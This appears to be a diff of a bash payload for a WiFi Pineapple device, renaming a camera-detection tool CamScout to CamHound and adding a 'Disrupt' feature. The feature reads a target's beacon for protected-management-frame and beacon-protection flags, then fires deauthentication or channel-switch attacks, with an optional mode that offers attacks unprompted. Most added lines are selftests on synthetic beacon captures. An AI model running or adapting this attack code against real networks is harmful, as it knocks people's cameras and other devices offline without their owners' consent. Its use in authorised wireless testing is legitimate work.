+    *)         set_state INCONCLUSIVE; LOG yellow "$verdict: recon could not settle it" ;;
+  esac
+  return 0
+}
+
+# auto_respond_ok <mac> -> 0 when the funnel may offer Disrupt without being asked.
+# Two keys, not one: RESPONSE opens the manual rung, AUTO_RESPOND additionally lets CamHound
+# raise it on its own. Note this resolves the target as a side effect, leaving R_* set.
+auto_respond_ok() {
+  [ "$RESPONSE" = 1 ] || return 1
+  [ "$AUTO_RESPOND" = 1 ] || return 1
+  [ -n "${IGNORED[$1]}" ] && return 1
+  resp_target "$1" >/dev/null 2>&1 || return 1
+  return 0
+}
+
+disrupt_row() {   # a cached badge is free to show; an uncached one is not worth a capture to render
+  local mac="$1" ap bss
+  [ "${ROLE[$mac]}" = cli ] && bss="${AP_OF[$mac]:--}" || bss="$mac"
+  if [ -n "${POSTURE[$bss]}" ] && (( EPOCHSECONDS - ${POSTURE_TS[$bss]:-0} < POSTURE_TTL )); then
+    printf 'Disrupt [%s]' "${POSTURE[$bss]}"
+  else
+    printf 'Disrupt'
+  fi
+}
+
+disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon says will work
+  local mac="$1" badge opts k exp items=() pickmap=() i=0 choice
+  if ! resp_target "$mac"; then
+    LOG red "nothing to attack: no associated BSS or no channel for $mac"; return 0
+  fi
+  LOG "reading posture ${R_BSSID:9} ch $R_CH"
+  badge=$(posture_of "$R_BSSID" "$R_BAND" "$R_CH")
+  opts=$(posture_opts "$badge")
+  LOG "[$badge] ${R_BSSID:9} ch$R_CH ${R_BAND}GHz"$'\n'"target ${R_TARGET:9}"$'\n'"$(posture_why "$badge")"
+  if [ -z "$opts" ]; then
+    LOG red "$(posture_why "$badge")"
+    confirm "Nothing is expected to work ($badge). Try anyway?" || return 0
+    opts='BOTH DEAUTH CSA'
+  fi
+  for k in $opts; do
+    exp=$(posture_expect "$badge" "$k")
+    items+=("$(printf '%s (%s)' "$k" "$exp")"); pickmap+=("$k"); i=$((i + 1))
+  done
+  pick_list "Disrupt [$badge] ${R_TARGET:9}" "${items[0]}" "${items[@]}" "Back" || return 0
+  [ "$PICK" = Back ] && return 0
+  choice=""
+  for ((i = 0; i < ${#items[@]}; i++)); do [ "$PICK" = "${items[$i]}" ] && choice="${pickmap[$i]}"; done
+  [ -n "$choice" ] || return 0
+  if [ "$RESPONSE_CONFIRM" = 1 ]; then
+    confirm "$choice on ${R_TARGET:9} via ${R_BSSID:9} ch $R_CH?" || { LOG "cancelled"; return 0; }
+  fi
+  resp_fire "$mac" "$choice" "$badge"
+}
+
+posture_why() {   # one line of plain English for a badge
+  case "$1" in
+    'D+C')   printf 'no PMF: deauth and CSA both land' ;;
+    'D?+C')  printf 'PMF optional: deauth works per-client, CSA lands' ;;
+    'C')     printf 'PMF required: deauth is ignored, CSA still lands' ;;
+    'NONE')  printf 'PMF + beacon protection: nothing here works' ;;
+    'NOINJ') printf 'DFS or 6 GHz: the radio may not transmit on this channel' ;;
+    *)       printf 'posture unread: no beacon captured' ;;
+  esac
+}
+# --- response rung end ---
+
 # --- watch core end ---
 
 # locate_target mac -> MONITOR RSSI loop, 5-sample median, hysteresis, staleness; A stops
@@ -1379,7 +1759,7 @@ write_report() {
   [ -n "$RUN_ID" ] || return 0
   [ "$quiet" = quiet ] && [ "$CYCLE" = 0 ] && return 0
   {
-    printf 'CamScout %s report  run %s  %s\n' "$VERSION" "$RUN_ID" "$(printf '%(%Y-%m-%d %H:%M)T' -1)"
+    printf 'CamHound %s report  run %s  %s\n' "$VERSION" "$RUN_ID" "$(printf '%(%Y-%m-%d %H:%M)T' -1)"
     printf 'mode %s  cycles %s  duration %ss  recon paused %ss  bands %s  sigs %s (%s)\n' "$MODE" "$CYCLE" "$((EPOCHSECONDS - RUN_T0))" "$PAUSED_SECS" "${BANDS_LINE:-?}" "$SIG_COUNT" "$SIG_SOURCE"
     for mac in "${!ROLE[@]}"; do
       case "${BANDNAME[$mac]}" in CONFIRMED) nc=$((nc + 1)) ;; LIKELY) nl=$((nl + 1)) ;; POSSIBLE) npo=$((npo + 1)) ;; STREAM) nlane=$((nlane + 1)) ;; MODULE) nmod=$((nmod + 1)) ;; esac
@@ -1437,10 +1817,27 @@ st_pcap() {   # synthetic LE pcap: st_pcap file orig_len count ts
   { le32 2712847316; printf '\x02\x00\x04\x00'; le32 0; le32 0; le32 32; le32 127
     for ((i = 0; i < n; i++)); do le32 $((ts + i / 2)); le32 $((i * 1000)); le32 32; le32 "$ol"; printf '%032d' 0 | tr 0 '\0'; done; } >"$f"
 }
+st_le32h() { printf '%02x%02x%02x%02x' $(( $1 & 255 )) $(( ($1 >> 8) & 255 )) $(( ($1 >> 16) & 255 )) $(( ($1 >> 24) & 255 )); }
+st_hex2bin() { local h="$1" i; for ((i = 0; i < ${#h}; i += 2)); do printf "\\x${h:$i:2}"; done; }
+st_beacon_pcap() {   # st_beacon_pcap file bssid12hex [rsn payload hex] [extcap payload hex]
+  local f="$1" bss="$2" rsn="$3" ext="$4" ies frame flen gh rec
+  ies="000463616d31"                                              # SSID "cam1"
+  [ -n "$rsn" ] && ies+="30$(printf %02x $(( ${#rsn} / 2 )))$rsn" # 0x30 = 48  RSN
+  [ -n "$ext" ] && ies+="7f$(printf %02x $(( ${#ext} / 2 )))$ext" # 0x7f = 127 Extended Capabilities
+  frame="0000080000000000"                                        # radiotap, it_len 8
+  frame+="80000000"                                               # FC beacon + duration
+  frame+="ffffffffffff${bss}${bss}0000"                           # addr1/2/3 + seq  -> 24 B header
+  frame+="000000000000000064001104"                               # timestamp 8 + interval 2 + caps 2
+  frame+="$ies"
+  flen=$(( ${#frame} / 2 ))
+  gh="d4c3b2a1020004000000000000000000$(st_le32h 65535)$(st_le32h 127)"
+  rec="$(st_le32h 0)$(st_le32h 0)$(st_le32h "$flen")$(st_le32h "$flen")"
+  st_hex2bin "$gh$rec$frame" >"$f"
+}
 selftest() {
   local tmp="${TMPDIR:-/tmp}/cs_st.$$" f lbl n ssid
   st_stub_ui; mkdir -p "$tmp"; LOOT_DIR="$tmp"; RUN_ID="selftest"
-  printf '== CamScout %s selftest ==\n' "$VERSION"
+  printf '== CamHound %s selftest ==\n' "$VERSION"
   # 1 signatures
   if f=$(find_install_dir); then load_signatures "$f/cam_signatures.txt"; SIG_SOURCE="file"; else load_signatures <(builtin_signatures); fi
   st "signatures loaded ($SIG_SOURCE, $SIG_COUNT rows)" "$(( SIG_COUNT > 20 ))" 1
@@ -1513,9 +1910,119 @@ selftest() {
   st "pcap bucket line" "$(pcap_buckets "$tmp/t.pcap" | head -1)" "1700000000 2400 2 2"
   pcap_buckets "$tmp/t.pcap" >"$tmp/t.b"; st "bucket stats" "$(bucket_stats "$tmp/t.b" | cut -d' ' -f1-4)" "10 20 24000 20"
   printf 'garbage' >"$tmp/bad.pcap"; pcap_buckets "$tmp/bad.pcap" >/dev/null 2>&1; st "bad magic rejected" "$?" 1
+  # 7b response posture (byte vectors; no radio needed)
+  # RSN caps low octet: 0xcc = MFPR+MFPC, 0x8c = MFPC only, 0x0c = neither
+  local XBP='0000000000000000000010'   # 11 octets, octet 10 bit 4 set -> beacon protection on
+  local XNO='0000000000000000000000'   # same length, bit clear
+  st "posture no PMF"               "$(posture_from_caps 0c00 - 2 6)"      "D+C"
+  st "posture PMF capable only"     "$(posture_from_caps 8c00 - 2 6)"      "D?+C"
+  st "posture PMF required"         "$(posture_from_caps cc00 - 2 6)"      "C"
+  st "posture PMF req + beacon prot" "$(posture_from_caps cc00 "$XBP" 2 6)" "NONE"
+  st "posture beacon prot bit clear" "$(posture_from_caps cc00 "$XNO" 2 6)" "C"
+  st "posture short extcap ignored"  "$(posture_from_caps cc00 0000000000 2 6)" "C"
+  st "posture unread rsn"           "$(posture_from_caps - - 2 6)"         "?"
+  st "posture garbage rsn"          "$(posture_from_caps zz00 - 2 6)"      "?"
+  st "posture 6 GHz never injects"  "$(posture_from_caps 0c00 - 6 37)"     "NOINJ"
+  st "posture 5 GHz DFS ch52"       "$(posture_from_caps 0c00 - 5 52)"     "NOINJ"
+  st "posture 5 GHz DFS ch144"      "$(posture_from_caps cc00 - 5 144)"    "NOINJ"
+  st "posture 5 GHz UNII-1 ch36"    "$(posture_from_caps cc00 - 5 36)"     "C"
+  st "posture 5 GHz UNII-3 ch149"   "$(posture_from_caps 0c00 - 5 149)"    "D+C"
+  st "posture unknown band"         "$(posture_from_caps 0c00 - '?' 6)"    "NOINJ"
+  st "posture non-numeric channel"  "$(posture_from_caps 0c00 - 2 x)"      "NOINJ"
+  # three operator-selectable attacks: command mapping, viability, honest per-option labels
+  st "cmd DEAUTH"  "$(response_cmd DEAUTH)" "PINEAPPLE_DEAUTH_CLIENT"
+  st "cmd CSA"     "$(response_cmd CSA)"    "PINEAPPLE_DEAUTH_CLIENT_CSA"
+  st "cmd BOTH"    "$(response_cmd BOTH)"   "PINEAPPLE_DEAUTH_CLIENT_ALL"
+  st "cmd unknown is empty" "$(response_cmd WAT)" ""
+  st "opts no PMF prefers BOTH"   "$(posture_opts 'D+C')"  "BOTH DEAUTH CSA"
+  st "opts PMF required leads CSA" "$(posture_opts C)"     "CSA BOTH DEAUTH"
+  st "opts beacon prot offers none" "$(posture_opts NONE)" ""
+  st "opts no-inject offers none"  "$(posture_opts NOINJ)" ""
+  st "opts unread offers all"      "$(posture_opts '?')"   "BOTH DEAUTH CSA"
+  st "expect deauth vs no PMF"     "$(posture_expect 'D+C' DEAUTH)"  "works"
+  st "expect deauth vs optional PMF" "$(posture_expect 'D?+C' DEAUTH)" "partial"
+  st "expect deauth vs required PMF" "$(posture_expect C DEAUTH)"    "blocked"
+  st "expect csa vs required PMF"  "$(posture_expect C CSA)"         "works"
+  st "expect csa vs beacon prot"   "$(posture_expect NONE CSA)"      "blocked"
+  st "expect both vs beacon prot"  "$(posture_expect NONE BOTH)"     "blocked"
+  st "expect anything on NOINJ"    "$(posture_expect NOINJ CSA)"     "blocked"
+  st "expect anything when unread" "$(posture_expect '?' DEAUTH)"    "unknown"
+  # 7c beacon element parsing (synthetic frames; no radio needed)
+  local RSN_PMF='0100000fac040100000fac040100000fac08cc00'   # 1 pairwise, 1 AKM, caps 0x00cc
+  local RSN_NOP='0100000fac040100000fac040100000fac020c00'   # same shape, caps 0x000c
+  st "ie_find first element"    "$(ie_find 0003616263 0 0)"              "616263"
+  st "ie_find later element"    "$(ie_find 0003616263dd0411223344 0 221)" "11223344"
+  ie_find 0003616263 0 48 >/dev/null 2>&1; st "ie_find absent element rc" "$?" 1
+  ie_find 000a6162 0 0 >/dev/null 2>&1;    st "ie_find truncated chain rc" "$?" 1
+  st "rsn_caps walks suite lists" "$(rsn_caps "$RSN_PMF")" "cc00"
+  rsn_caps 0100000f >/dev/null 2>&1; st "rsn_caps short element rc" "$?" 1
+  st_beacon_pcap "$tmp/b_open.pcap" aabbccddeeff "" ""
+  st "beacon: open network"       "$(posture_read_pcap "$tmp/b_open.pcap" 2 6)" "D+C"
+  st_beacon_pcap "$tmp/b_np.pcap" aabbccddeeff "$RSN_NOP" "$XNO"
+  st "beacon: WPA2 without PMF"   "$(posture_read_pcap "$tmp/b_np.pcap" 2 6)"   "D+C"
+  st_beacon_pcap "$tmp/b_pmf.pcap" aabbccddeeff "$RSN_PMF" ""
+  st "beacon: PMF required"       "$(posture_read_pcap "$tmp/b_pmf.pcap" 2 6)"  "C"
+  # POSTURE_RSN/POSTURE_EXT only reach the caller when not run in a subshell, so re-run in-shell
+  posture_read_pcap "$tmp/b_pmf.pcap" 2 6 >/dev/null
+  st "beacon: rsn caps extracted" "$POSTURE_RSN"                                "cc00"
+  st "beacon: absent extcap stays -" "$POSTURE_EXT"                             "-"
+  st_beacon_pcap "$tmp/b_bp.pcap" aabbccddeeff "$RSN_PMF" "$XBP"
+  st "beacon: PMF + beacon prot"  "$(posture_read_pcap "$tmp/b_bp.pcap" 2 6)"   "NONE"
+  st "beacon: DFS beats posture"  "$(posture_read_pcap "$tmp/b_pmf.pcap" 5 52)" "NOINJ"
+  st "beacon: UNII-1 reads normally" "$(posture_read_pcap "$tmp/b_pmf.pcap" 5 36)" "C"
+  printf 'garbage' >"$tmp/b_bad.pcap"; beacon_find "$tmp/b_bad.pcap" >/dev/null 2>&1
+  st "beacon: bad magic rejected" "$?" 1
+  st_pcap "$tmp/b_data.pcap" 1200 4 1700000000; beacon_find "$tmp/b_data.pcap" >/dev/null 2>&1
+  st "beacon: no beacon in file rc" "$?" 1
+  # 7d response rung: target resolution, effect verdicts, loot row
+  st_device aa:00:00:00:00:10 ap "Reolink" "cam-ap" 0 -
+  CH[aa:00:00:00:00:10]=6; BAND[aa:00:00:00:00:10]=2
+  resp_target aa:00:00:00:00:10
+  st "resp_target ap targets broadcast" "$R_TARGET" "ff:ff:ff:ff:ff:ff"
+  st "resp_target ap is its own bssid"  "$R_BSSID"  "aa:00:00:00:00:10"
+  st "resp_target ap channel"           "$R_CH"     "6"
+  st_device aa:00:00:00:00:11 cli "Wyze" "" 0 aa:00:00:00:00:10
+  CH[aa:00:00:00:00:11]=0
+  resp_target aa:00:00:00:00:11
+  st "resp_target cli uses ap bssid"    "$R_BSSID"  "aa:00:00:00:00:10"
+  st "resp_target cli targets itself"   "$R_TARGET" "aa:00:00:00:00:11"
+  st "resp_target cli rides ap channel" "$R_CH"     "6"
+  st_device aa:00:00:00:00:12 cli "Espressif" "" 0 -
+  resp_target aa:00:00:00:00:12 >/dev/null 2>&1; st "resp_target unassociated rc" "$?" 1
+  st_device aa:00:00:00:00:13 ap "Hikvision" "x" 0 -
+  CH[aa:00:00:00:00:13]=0
+  resp_target aa:00:00:00:00:13 >/dev/null 2>&1; st "resp_target no channel rc" "$?" 1
+  st "verdict target vanished"  "$(resp_verdict 100 50 - - 0)"     "MOVED"
+  st "verdict counter advanced" "$(resp_verdict 100 50 140 60 1)"  "NO_EFFECT"
+  st "verdict counter stalled"  "$(resp_verdict 100 50 100 50 1)"  "MOVED"
+  st "verdict stalled but seen" "$(resp_verdict 100 50 100 60 1)"  "INCONCLUSIVE"
+  st "verdict no baseline"      "$(resp_verdict - - 140 60 1)"     "INCONCLUSIVE"
+  st "verdict no follow-up"     "$(resp_verdict 100 50 - - 1)"     "INCONCLUSIVE"
+  st "verdict non-numeric"      "$(resp_verdict x 50 y 60 1)"      "INCONCLUSIVE"
+  POSTURE[aa:00:00:00:00:10]=C; POSTURE_TS[aa:00:00:00:00:10]=$EPOCHSECONDS
+  st "disrupt row shows cached badge" "$(disrupt_row aa:00:00:00:00:10)" "Disrupt [C]"
+  st "disrupt row bare when uncached" "$(disrupt_row aa:00:00:00:00:13)" "Disrupt"
+  R_BSSID=aa:00:00:00:00:10; R_TARGET=ff:ff:ff:ff:ff:ff; R_CH=6; R_BAND=2
+  POSTURE_RSN=cc00; POSTURE_EXT=-; rm -f "$tmp/responses.tsv"
+  resp_write aa:00:00:00:00:10 C CSA PINEAPPLE_DEAUTH_CLIENT_CSA ok 10 10 MOVED
+  st "response header written"           "$(head -1 "$tmp/responses.tsv")" "$RESP_HDR"
+  st "response row field count = header" "$(sed -n 2p "$tmp/responses.tsv" | awk -F'|' '{print NF}')" \
+                                         "$(printf '%s\n' "$RESP_HDR" | awk -F'|' '{print NF}')"
+  st "posture_why covers NOINJ" "$(posture_why NOINJ | grep -c 'may not transmit')" "1"
+  RESPONSE=0; AUTO_RESPOND=0
+  auto_respond_ok aa:00:00:00:00:10 2>/dev/null; st "auto_respond off by default"     "$?" 1
+  RESPONSE=1
+  auto_respond_ok aa:00:00:00:00:10 2>/dev/null; st "auto_respond needs its own key"  "$?" 1
+  AUTO_RESPOND=1
+  auto_respond_ok aa:00:00:00:00:10 2>/dev/null; st "auto_respond with both keys"     "$?" 0
+  IGNORED[aa:00:00:00:00:10]=1
+  auto_respond_ok aa:00:00:00:00:10 2>/dev/null; st "auto_respond skips ignored"      "$?" 1
+  unset "IGNORED[aa:00:00:00:00:10]"
+  auto_respond_ok aa:00:00:00:00:12 2>/dev/null; st "auto_respond skips unattackable" "$?" 1
+  RESPONSE=0; AUTO_RESPOND=0
   # 8 marked blocks
   if command -v md5sum >/dev/null 2>&1 && [ -f "${BASH_SOURCE[0]}" ]; then
-    printf 'lib block md5   %s\n' "$(sed -n '/^# --- camscout lib begin ---/,/^# --- camscout lib end ---/p' "${BASH_SOURCE[0]}" | md5sum | cut -c1-32)"
+    printf 'lib block md5   %s\n' "$(sed -n '/^# --- camhound lib begin ---/,/^# --- camhound lib end ---/p' "${BASH_SOURCE[0]}" | md5sum | cut -c1-32)"
     printf 'watch block md5 %s\n' "$(sed -n '/^# --- watch core begin ---/,/^# --- watch core end ---/p' "${BASH_SOURCE[0]}" | md5sum | cut -c1-32)"
   fi
   rm -rf "$tmp"
@@ -1542,7 +2049,7 @@ replay() {   # --replay <pcap or bucket file>
 case "${1:-}" in
   --selftest) selftest; exit $? ;;
   --replay)   replay "${2:-}"; exit $? ;;
-  -h|--help)  printf 'CamScout %s: run from the Pager UI. Laptop: --selftest | --replay <pcap|bucket file>\n' "$VERSION"; exit 0 ;;
+  -h|--help)  printf 'CamHound %s: run from the Pager UI. Laptop: --selftest | --replay <pcap|bucket file>\n' "$VERSION"; exit 0 ;;
 esac
 set_state SETUP
 INSTALL_DIR=$(find_install_dir) || INSTALL_DIR=""
@@ -1552,7 +2059,7 @@ apply_mode
 load_overrides
 (( CFG_OVERRIDES > 0 )) && { LOG yellow "cfg: $CFG_OVERRIDES overrides"; log cfg "$CFG_NOTE"; }
 log run "start v$VERSION run=$RUN_ID sigs=$SIG_COUNT($SIG_SOURCE) jq=$HAVE_JQ tcpdump=$HAVE_TCPDUMP bands=${BANDS_LINE:-?} mode=$MODE"
-LOG "CamScout $VERSION [$MODE]"$'\n'"sigs: $SIG_COUNT ($SIG_SOURCE)$( [ "$HAVE_JQ" = 1 ] || printf ' no-jq')$( [ "$HAVE_TCPDUMP" = 1 ] || printf ' no-tcpdump')"$'\n'"bands: ${BANDS_LINE:-?}"$'\n'"prox: uncal"
+LOG "CamHound $VERSION [$MODE]"$'\n'"sigs: $SIG_COUNT ($SIG_SOURCE)$( [ "$HAVE_JQ" = 1 ] || printf ' no-jq')$( [ "$HAVE_TCPDUMP" = 1 ] || printf ' no-tcpdump')"$'\n'"bands: ${BANDS_LINE:-?}"$'\n'"prox: uncal"
 [ "$HAVE_TCPDUMP" = 1 ] || LOG yellow "tcpdump missing: Watch disabled"
 main_menu
 REPORT_DONE_AT_EXIT=1; write_report quiet
